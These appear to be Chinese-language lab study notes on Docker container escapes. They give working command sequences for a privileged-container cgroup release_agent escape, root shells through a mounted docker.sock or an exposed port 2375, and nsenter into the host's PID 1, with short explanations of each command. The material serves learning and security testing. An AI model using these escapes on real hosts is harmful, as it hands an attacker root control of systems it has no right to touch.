#### 概述：容器漏洞基础 (Overview: Container Vulnerability Basics)

虽然 Docker 容器旨在隔离应用程序，但它们仍然可能存在漏洞。常见的攻击路径包括：

- **配置不当的容器 (Misconfigured Containers)**: 容器拥有了其功能所不需要的过多权限。例如，以“特权”模式运行的容器，它会移除所有隔离层，允许容器直接访问主机操作系统。
    
- **易受攻击的镜像 (Vulnerable Images)**: 使用的 Docker 基础镜像或应用程序本身包含已知漏洞。已有大量流行的 Docker 镜像被发现植入了后门，用于加密货币挖矿等恶意活动。
    
- **网络连接性问题 (Network Connectivity Issues)**: 容器网络配置不当，将不应暴露的端口（如数据库端口）暴露于公网。此外，一旦攻击者攻陷一个容器，他们可能利用其网络访问权限横向移动到其他内部容器或网络。
    

#### 1. 逃逸技术：利用特权容器 (Escape Technique: Abusing Privileged Containers)

##### 理解特权模式与 Linux 能力 (Understanding Privileged Mode & Linux Capabilities)

Docker 容器可以以两种模式运行：

- **用户模式 (User Mode)**: 默认模式，容器通过 Docker 引擎与操作系统交互，受到多重安全机制的限制。
    
- **特权模式 (Privileged Mode)**: 使用 `--privileged` 标志运行。在这种模式下，容器**绕过** Docker 引擎，直接与主机操作系统通信，并被授予主机上**所有**的 Linux 能力 (Capabilities)，等同于在主机上拥有 root 权限。
    

##### 漏洞利用：挂载主机 cgroups

如果一个容器是特权的，我们可以利用其权限挂载主机的 cgroups 文件系统，并利用 `notify_on_release` 机制在主机上执行任意命令。

1. **创建并挂载 cgroup**:
    
    Bash
    
    ```
    mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
    ```
    
2. **设置 `notify_on_release`**: 告诉内核当这个 cgroup 中的最后一个进程退出时，执行 `release_agent` 文件中指定的命令。
    
    Bash
    
    ```
    echo 1 > /tmp/cgrp/x/notify_on_release
    ```
    
3. **获取容器在主机上的路径**:
    
    Bash
    
    ```
    host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
    ```
    
4. **设置 `release_agent`**: 将我们想要在主机上执行的脚本路径写入 `release_agent` 文件。
    
    Bash
    
    ```
    echo "$host_path/exploit" > /tmp/cgrp/release_agent
    ```
    
5. **创建将在主机上执行的脚本 (`/exploit`)**:
    
    Bash
    
    ```
    echo '#!/bin/sh' > /exploit
    echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
    ```
    
6. **赋予脚本执行权限**:
    
    Bash
    
    ```
    chmod a+x /exploit
    ```
    
7. **触发 `release_agent`**: 创建一个新进程，将其 PID 写入 `cgroup.procs` 文件中，然后这个进程会立即退出，从而触发 `notify_on_release` 机制。
    
    Bash
    
    ```
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
    ```
    

执行完毕后，`exploit` 脚本就会在主机上以 root 权限执行。

#### 2. 逃逸技术：利用暴露的 Docker 守护进程 (Escape Technique: Abusing Exposed Docker Daemons)

##### 场景一：容器内挂载的 Docker 套接字

**Docker 套接字 (`docker.sock`)** 是一个 Unix 套接字文件，Docker 客户端通过它与 Docker 守护进程通信。如果这个套接字被挂载到容器内部，那么容器内的 root 用户就可以通过它控制**主机**的 Docker 守护进程。

- **漏洞利用**: 只需要一条命令，就可以在容器内启动一个**新的、拥有主机 root 权限的容器**。
    
    Bash
    
    ```
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    ```
    
- **命令分解**:
    
    - `docker run`: 从容器**内部**调用主机的 Docker 守护进程。
        
    - `-v /:/mnt`: 启动一个新容器，并将**主机**的根文件系统 (`/`) 挂载到新容器的 `/mnt` 目录。
        
    - `--rm -it alpine`: 使用轻量级的 `alpine` 镜像，并以交互模式运行。
        
    - `chroot /mnt sh`: 在新容器内，将根目录切换到 `/mnt`（即主机的根目录），并启动一个 shell。此时，你已经获得了对主机的 root shell。
        

##### 场景二：网络上暴露的 Docker TCP 端口

Docker 守护进程也可以配置为监听一个 TCP 端口（默认为 `2375`），以进行远程管理。如果此端口未受保护地暴露在网络上，任何能够访问该端口的人都可以控制 Docker 主机。

- **枚举**:
    
    - 使用 Nmap 扫描目标端口: `nmap <target_ip> -p 2375`
        
    - 使用 `curl` 确认可以访问 Docker API: `curl http://<target_ip>:2375/version`
        
- **漏洞利用**: 使用 `-H` (Host) 参数，将你本地的 Docker 客户端指向远程的、暴露的 Docker 守护进程。
    
    Bash
    
    ```
    # 列出远程主机上的容器
    docker -H tcp://<target_ip>:2375 ps
    
    # 在远程主机上执行命令 (与场景一类似)
    docker -H tcp://<target_ip>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
    ```
    

#### 3. 逃逸技术：利用共享命名空间 (Escape Technique: Abusing Shared Namespaces)

**命名空间 (Namespaces)** 是 Docker 实现容器化的核心隔离机制。每个容器都有自己独立的进程空间 (PID namespace)。

##### 判断是否在容器中

- **进程数量**: 运行 `ps aux`。在一个典型的容器中，进程数量非常少。在主机上，进程数量则会多得多。
    
- **PID 1**: 在容器中，你的主应用程序通常是 PID 1。
    

##### 漏洞利用：`nsenter`

在某些特殊情况下（如调试），容器可能会被配置为与主机共享 PID 命名空间。这意味着在容器内运行 ps aux 会看到主机上的所有进程。

我们可以利用 nsenter 命令进入主机上任意进程的命名空间。通过进入主机上 PID 为 1 的进程（通常是 init 或 systemd）的命名空间，我们可以获得一个主机的 root shell。

- **命令**:
    
    Bash
    
    ```
    nsenter --target 1 --mount --uts --ipc --net --pid /bin/bash
    ```
    
- **参数分解**:
    
    - `--target 1`: 指定目标进程为 PID 1。
        
    - `--mount`, `--uts`, `--ipc`, `--net`, `--pid`: 指示 `nsenter` 进入目标进程的所有主要命名空间（挂载、主机名、进程间通信、网络、进程ID）。
        
    - `/bin/bash`: 在进入这些命名空间后，执行 `/bin/bash` 命令，从而获得一个 shell。